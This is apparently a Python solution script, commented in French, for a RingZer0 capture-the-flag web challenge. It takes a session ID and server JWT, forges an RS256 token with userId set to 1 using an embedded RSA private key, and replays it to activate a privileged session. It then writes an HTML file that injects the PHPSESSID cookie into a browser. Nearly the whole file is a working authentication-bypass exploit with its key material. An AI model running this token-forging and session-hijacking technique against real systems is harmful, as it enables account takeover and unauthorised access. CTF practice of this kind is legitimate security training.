import jwt
import time
import urllib.request
import urllib.parse
import json
import base64
import http.cookiejar
import webbrowser
import subprocess
import sys

PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEAv/C35qbLBlFAPsNIBpd+jCM+PeGLdecF322miubjQXbulqcS
epWf/oB+sk/CHQUz8q4IsPQVGe6750vDTCuqHT3ap2AyHw0jtn4PckRAmUSZS+8l
ZduToym8n0YsU5FrqkAmqeA2ARse6/tHA0ZOy5Fhk/dQ/er6o8mO/s+EZglmvO5R
1mqABLFJU6FY7Na9i85mllr0glcNv9k6qQ3K6hhVGtREJpjLatvl1jYVtodAk4Bn
esUrjkyisjnRBgOimp9o83n0I4Co44d2gFdbU3dw3u9pHmQywLMMoPEesk67cGY1
WYrWI8Dz6xtgN6cr+WJXI38tT9ZZf2pUnRYw0fQ5oWKA4Kz+UtTMx5akgasl6E5x
Ixz6F2YKb7SkTTpuJQ6ZP2ZOGBT5ZLAX1cqgoAgyLnOjhexx4eK+78JS5JZOstrc
Xi5ciBCmMAzqNx3zpOoOPVV8i+1DYtwi0ObO/WFnJu4R92ogy04fgQjy+oH6TJUc
MJXDK1qWOBdjgL+OjD9u+zikGvzqnDrb6HHJjTy0DlLpjrxKqq+sneHygn9xQDDz
XZqAJLTJ2mgTFcCogwmwl2vgMgnohJ/DG2RPHypQjgxwgIMZVnYgPwKyzQV1WPeb
2EoEhhpmYfc37N8wDp1O6DN4xmwdJ9uRKsSONtdAVQRSTt4nqsLjrSZfz1UCAwEA
AQKCAgBGWR/N9cvroNP/LOu1HslO64vgek33BJlubm3f8wfP8ps3tDxdmYFucgH9
sKXgpQuJIqgk0xD41DsiZu5JeKd82DLPrb4xC0vPkxxuMP3MLwxQfHIkhvnxj1aG
ud19M4tWdvS0xmyEsz/+FbbNSHOQwNQWu0qABiOe7Dzwv3YzP7bcAC0WfSo2jhPm
BvjktT/7gcavzN5Y9zce3atWUqvQaOKoVqwzyUSlAbuXa3NB1wigByvmH2X7XbMz
x2UI40Qxj8OTmVsVuA4udnPETkA2s0w3KWBJt0eywO0b/8PUbm7cn1lmXDBoIkxE
G2CEhUzktlphtDcTT+i1fm9Ms9loNiPf+SK+X5maQThNkqbmTS344E0uWw+rAfE4
yjVfuxCvpCqxVrAbDRtuusgl1ES26erbPhCOWyuZA1btOTyw1jy1V9cc8Ruz1l24
477WUTFfyVycdbPqorXcvDi4tr3hDfPVfWB58tJRk2Flyd1RVUoz+w+kxHXDQQzA
+Qrp5g8KcrLEb9l1gvPZtYAg2ZfgaloTff1bK9+tgtWtcZd3cSFAKEEYUQhZYYYJ
REPDZFZnu0GqNJe6bDzmAoGeO5PTX8HBhTNZXy8kBWT7tKM/mwQJpSsmMGRZSjY9
zcaVkOUcucKir7SWWNkaDsq0LyQ0zTsKHJkp1dNLldaI6iZVAQKCAQEA/oNYWmR6
xc48FwhIi+mAlhKOoZ1HCaxzd9+/W4Z+9cPyPN/8fbiunXsIKcoEyxBSfZMrc4EJ
BehYo6zOQAaS0Fe4NLvv0ooQ7A3xAYQMdEg0U+2cyjApZ4B2SWUMuCEEx19QFRQh
GLrDbcFmeLuwCTq6QfvkgdS60wCuz84ITJYEZLrtErRuUq/lUWToaTmlHbhddOmd
MG+0MFUbTi+9QZSFxyzCSCf9mF0yM1PpbQqSRUATK0QqisSN1XU7d3kwj4Q1wD6g
64BpYxWDQ1H7I5ydIJLRsMX60OEE/WgkunCCM5AYRD76Vhhxo+vgYhGzJD0MCbe3
Wq7Jmh4HMX4FBQKCAQEAwQ/JxFdRzIBCHBVApBy/TTfHK5c1ueJbvRiKoCjTl6nJ
NnqT2bCifos83mRRsoCJwFFIZOq4zNo8I1GPXiBjIrayIKTK3atypQaVZkqlx/vU
6TYYA7oy9fYWX0UcOKuV/2XjtZY1Q9bJMMfm3BD5XAUW5OLTLMImG7otbtkuFwxO
XnaXIwRg8po+bAZCItCvRRyKMzXcDA82widKkVI2l2xA5f1Wym3ecpaTjEzXEDKu
CCpfcAmPJjgaxvuhoNhUoB11Vy8z7qUKsoOqjMlDeFad0JbouBULyvQ/IkOz8SLR
s2BLU6E9ua9rJSK46FgQwBovXIkLZVHmTjjkvrSyEQKCAQEAkX3UDBhUdq8meqQp
lJGvCBsjng+ihE0o1OX7Jf8EpMmWuGXymIvyhePHDtyFUO/LuC1hMW4aEl54DVjD
rqYTVzZN/xdQSTLT6Z0uoIcz92UvRKsYbhyKDrjI5bv2QWvep3o89U/Ee7aH8T4V
rf7c6um/f+jW/8Dz65sAU5qb8+vuJwcUbxTl3C7hEF523XAui4bRJfxF92Jjxx1f
tppjvhGBSBK2HTl/JpJgGCdn0QWyCBRQ4PLevuUNj3CsxedpcyFI+NTUeMu3cwTh
PKKoxfrJd812QW9rqex4RcQ6+rlGNOOye5Dk2kKu893rLySfG6AqOYPkNNqmNIvl
4M0BYQKCAQAhqMECrD6kqs/b2ZC1jBWGPu1ImkpRqDdaVocEuVl6na1pBCH22Cbc
bSYll9PujR53GzTF825YuMu3VKbsQDVIfhW8Pz7nOtb4EpfFh8ozfaJ3LmktbS8p
Vsg7v+7VqoSyTG9Q32lV9IKLMK79OzBebLy7Fxi+OvMt7l2xb8frWMfpDD/5aPAG
HAI6DzVEoKGOKRWnLAK7T4O6geMsRushp0wBTRPuow0faUU8NsFgH5Xb8pdFD0WX
4jw46PIa+tx2NeyZUK97MecVjIMVnJlYx7EoBsd4IKM3tTG0pZ0fs3RgE6/OWtRK
JV1G0jDuwTvaYjZTqckE1yySArVO0m4hAoIBAQDJrtzGH5GG655no8BOcYcyvhG4
s6oFq5cLyNE2m4vteehkmEg+AvSigDsCj6wZVTkkLR2j8sZzofvFYNFH8H7g8jku
YL5UX8lQ5Ol7dfklnOJTl8HX4yAq/uljdk0O9SbZy8n39bVgeMgMtJG1vSphQIl+
lf5h4G4oRvpxLU7oD2Gk62WEsxVkWXQ+tGJHn2FTwkeFqbk8ODML6ETL6AZpimjy
vLsOnHak8+GAu8UE/uK5xeKOZgHeH694pt9Hb3SuFijbGItKOej35c6bRI91Xhil
Hywm2p/cYIX/ya40cUR6OaH3FPwYlUqSWC11uPOD9+92reAAJwdXyimf5N1+
-----END RSA PRIVATE KEY-----"""

PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAv/C35qbLBlFAPsNIBpd+
jCM+PeGLdecF322miubjQXbulqcSepWf/oB+sk/CHQUz8q4IsPQVGe6750vDTCuq
HT3ap2AyHw0jtn4PckRAmUSZS+8lZduToym8n0YsU5FrqkAmqeA2ARse6/tHA0ZO
y5Fhk/dQ/er6o8mO/s+EZglmvO5R1mqABLFJU6FY7Na9i85mllr0glcNv9k6qQ3K
6hhVGtREJpjLatvl1jYVtodAk4BnesUrjkyisjnRBgOimp9o83n0I4Co44d2gFdb
U3dw3u9pHmQywLMMoPEesk67cGY1WYrWI8Dz6xtgN6cr+WJXI38tT9ZZf2pUnRYw
0fQ5oWKA4Kz+UtTMx5akgasl6E5xIxz6F2YKb7SkTTpuJQ6ZP2ZOGBT5ZLAX1cqg
oAgyLnOjhexx4eK+78JS5JZOstrcXi5ciBCmMAzqNx3zpOoOPVV8i+1DYtwi0ObO
/WFnJu4R92ogy04fgQjy+oH6TJUcMJXDK1qWOBdjgL+OjD9u+zikGvzqnDrb6HHJ
jTy0DlLpjrxKqq+sneHygn9xQDDzXZqAJLTJ2mgTFcCogwmwl2vgMgnohJ/DG2RP
HypQjgxwgIMZVnYgPwKyzQV1WPeb2EoEhhpmYfc37N8wDp1O6DN4xmwdJ9uRKsSO
NtdAVQRSTt4nqsLjrSZfz1UCAwEAAQ==
-----END PUBLIC KEY-----"""

BASE_URL = 'http://challenges.ringzer0ctf.com:10351'

# Étape 1 — POST /login sans Bearer pour obtenir PHPSESSID + token serveur
print("[*] Étape 1 — POST /login pour obtenir PHPSESSID et token serveur...")
body = urllib.parse.urlencode({'username': '', 'passwd': '', 'signin': 'signin'}).encode()
req1 = urllib.request.Request(f'{BASE_URL}/login', data=body,
    headers={'Content-Type': 'application/x-www-form-urlencoded'})

cookiejar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookiejar))
resp1 = opener.open(req1)
auth_header = resp1.headers.get('Authorization', '')

# Extraire le PHPSESSID
phpsessid = None
for cookie in cookiejar:
    if cookie.name == 'PHPSESSID':
        phpsessid = cookie.value
        break
print(f"[+] PHPSESSID: {phpsessid}")

# Étape 2 — Décoder et forger le JWT
print("\n[*] Étape 2 — Décodage et forge du JWT...")
server_token = auth_header.replace('Bearer ', '').strip()
server_payload = jwt.decode(server_token, PUBLIC_KEY, algorithms=['RS256'])
forged_payload = server_payload.copy()
forged_payload['userId'] = 1
forged_token = jwt.encode(forged_payload, PRIVATE_KEY, algorithm='RS256')
print(f"[+] Token forgé: {forged_token[:60]}...")

# Étape 3 — POST /login avec JWT forgé pour setter la session côté serveur
print("\n[*] Étape 3 — POST /login avec JWT forgé pour activer la session...")
req2 = urllib.request.Request(
    f'{BASE_URL}/login',
    data=body,
    headers={
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': f'Bearer {forged_token}'
    }
)
resp2 = opener.open(req2)
print(f"[+] Session activée sur le serveur")

# Étape 4 — Ouvrir Chrome avec le PHPSESSID injecté via JavaScript
print(f"\n[*] Étape 4 — Ouverture du browser avec la session...")
print(f"[!] PHPSESSID à injecter: {phpsessid}")
print(f"\nColle ce code dans la console de ton browser sur n'importe quelle page du site :")
print(f"\n  document.cookie = 'PHPSESSID={phpsessid}; path=/';\n")
print(f"Puis navigue vers: {BASE_URL}/home")
print(f"\nOU ouvre directement cette URL (Chrome avec cookie via JS) :")

# Ouvre Chrome avec une page qui injecte le cookie automatiquement
html = f"""<html><body>
<script>
  document.cookie = 'PHPSESSID={phpsessid}; path=/; domain=challenges.ringzer0ctf.com';
  window.location = '{BASE_URL}/home';
</script>
</body></html>"""

with open('/tmp/inject.html', 'w') as f:
    f.write(html)

subprocess.Popen(['open', '/tmp/inject.html'])
print("[+] Browser ouvert avec injection automatique du cookie!")